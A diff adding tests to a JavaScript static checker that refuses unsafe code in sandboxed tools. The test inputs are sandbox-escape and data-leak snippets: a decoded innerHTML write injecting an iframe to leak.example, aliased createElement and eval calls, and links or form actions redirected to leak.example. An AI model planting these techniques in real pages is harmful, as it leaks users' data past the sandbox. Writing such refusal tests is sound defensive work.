@@ -161,6 +161,90 @@ describe("the tool's JavaScript (VER-01, ADR 0009)", () => {
     }
   });
 
+  it("ADR 0009: follows the page's objects into variables, parameters and containers, and refuses names computed at run time on them", () => {
+    for (const js of [
+      // Codex's review of #168, F1: a decoded name on an element.
+      'const name = atob("aW5uZXJIVE1M"); document.body[name] = "<iframe src=https://leak.example></iframe>";',
+      "const box = document.getElementById('box'); box[key] = html;",
+      "const box = document.querySelector('#box'); const again = box; again[key] = html;",
+      "document.querySelectorAll('li').forEach((li) => { li[key] = html; });",
+      "for (const li of document.querySelectorAll('li')) li[key] = html;",
+      "const items = Array.from(document.querySelectorAll('li')); items[i][key] = html;",
+      "const ui = { box: document.getElementById('box') }; ui.box[key] = html;",
+      "const parts = []; parts.push(document.body); parts[0][key] = html;",
+      "function paint(target) { target[key] = html; } paint(document.body);",
+      "function find() { return document.body; } find()[key] = html;",
+      "button.addEventListener('click', (event) => { event.target[key] = html; });",
+      "document.addEventListener('click', (event) => { event.view[key] = 'x'; });",
+      "const { body } = document;",
+      "Object.assign(document.body, { [key]: html });",
+      "const copy = { ...document.body };",
+      "for (const name in document.body) {}",
+      "class Panel { constructor() { this.box = document.body; } paint() { this[key] = html; } }",
+      "class Fancy extends HTMLElement {}",
+      // An element with an id is a global of that name, so an undeclared name may be one.
+      "box[key] = html;",
+      "box.addEventListener('click', (event) => { event.target[key] = html; });",
+    ]) {
+      expect(refusedJs(js), js).toBe(true);
+    }
+  });
+
+  it("ADR 0009: refuses aliases of the page's methods and qualified forbidden APIs (Codex, F2)", () => {
+    for (const js of [
+      'const d = window.document; const make = d.createElement.bind(d); const frame = make("iframe"); frame.src = "https://leak.example"; document.body.append(frame);',
+      "const make = document.createElement; make('iframe');",
+      "document.createElement.call(document, 'iframe');",
+      "el.setAttribute.apply(el, ['onclick', code]);",
+      'const doc = new window.DOMParser().parseFromString(atob("PGlmcmFtZT48L2lmcmFtZT4="), "text/html");',
+      "window.eval(code)",
+      "new self.Function(code)",
+      "window.Reflect.set(el, 'innerHTML', html)",
+      "const attr = document.createAttribute('onclick'); el.setAttributeNode(attr);",
+      "el.getRootNode().write('x')",
+    ]) {
+      expect(refusedJs(js), js).toBe(true);
+    }
+  });
+
+  it("SBX-07: refuses writing an address, directly or in parts (Codex, F3)", () => {
+    for (const js of [
+      'const a = document.getElementById("go"); a.href = "https://leak.example"; a.click();',
+      "link.hostname = 'leak.example';",
+      "link.host += '.example';",
+      "link.protocol = 'https:';",
+      "({ href: link.href } = values);",
+      "form.action = 'https://leak.example';",
+      "button.formAction = 'https://leak.example';",
+    ]) {
+      expect(refusedJs(js), js).toBe(true);
+    }
+    // Together with the accepted HTML: the pair is refused, through its JavaScript.
+    const pair = staticCheck({
+      html: '<a id="go">Go</a>',
+      css: "",
+      js: 'const a = document.getElementById("go"); a.href = "https://leak.example"; a.click();',
+    });
+    expect(pair.ok).toBe(false);
+  });
+
+  it("ADR 0009: knows where `this` is the page, even inside a class (Codex, F4)", () => {
+    for (const js of [
+      'class C { [this["loc" + "ation"] = "https://leak.example"]() {} }',
+      "class C { [this.open]() {} }",
+      "class C { m() { return function () { return this; }; } }",
+      "const o = { m() { return this; } };",
+      "function f() { return this; }",
+    ]) {
+      expect(refusedJs(js), js).toBe(true);
+    }
+    expect(
+      checkJs(
+        "class C { constructor() { this.n = 1; } m() { const f = () => this.n; return f(); } static s = 1; }",
+      ),
+    ).toEqual([]);
+  });
+
   it("VER-01: ordinary code passes: names written out, events, text, and `this` in a class", () => {
     expect(
       checkJs(`
@@ -172,7 +256,18 @@ describe("the tool's JavaScript (VER-01, ADR 0009)", () => {
         list.append(item);
         const totals = {};
         totals[name] = (totals[name] ?? 0) + 1;
+        const rows = [];
         rows[index].done = true;
+        async function load(i, field, key, save) {
+          const records = (await tessera.call("data.read")).data.items;
+          const input = document.getElementById("field");
+          records[i][field] = input.value;
+          const item = document.createElement("li");
+          item.dataset[key] = "1";
+          const form = document.getElementById("add");
+          const text = form.item.value.trim();
+          save([{ title: text, count: Number(input.value) }]);
+        }
         class Timer { start() { this.at = Date.now(); } }
         setTimeout(() => draw(), 100);
         const url = URL.createObjectURL(blob);
@@ -223,6 +318,6 @@ describe("real tools (VER-01)", () => {
       js: 'location.href = "x"',
     });
     expect(result.ok).toBe(false);
-    expect(!result.ok && result.findings.map((f) => f.part)).toEqual(["html", "js"]);
+    expect(!result.ok && [...new Set(result.findings.map((f) => f.part))]).toEqual(["html", "js"]);
   });
 });
